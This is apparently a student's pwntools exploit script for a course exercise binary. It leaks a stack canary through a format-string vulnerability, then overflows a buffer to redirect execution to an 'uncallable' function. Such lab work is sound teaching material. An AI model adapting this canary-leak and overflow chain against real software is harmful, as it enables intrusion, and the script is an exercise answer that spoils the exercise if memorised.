#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise5/exercise5a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *check_authorization+145
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
r.recvline()

# leak canary from stack exploit string formatting vulnerability
r.sendline(b"%08x-"*7)

string = r.recvuntil(b"is not the password")
string = string.strip(b" is not the password\n")

canary = string.split(b"-")[6].decode()
canary = p32(int(canary, 16))

# objective is to redirect execution to uncallable as in 1b
uncallable_address = p64(ELF(exe).symbols['uncallable'])

# correct stack misalignment
ret_address = p64(0x401540)

r.recvline()
r.sendline(b"A"*8 + canary + b"A"*244 + canary + b"A"*20 + ret_address + uncallable_address)
print(r.recvall(timeout=2))

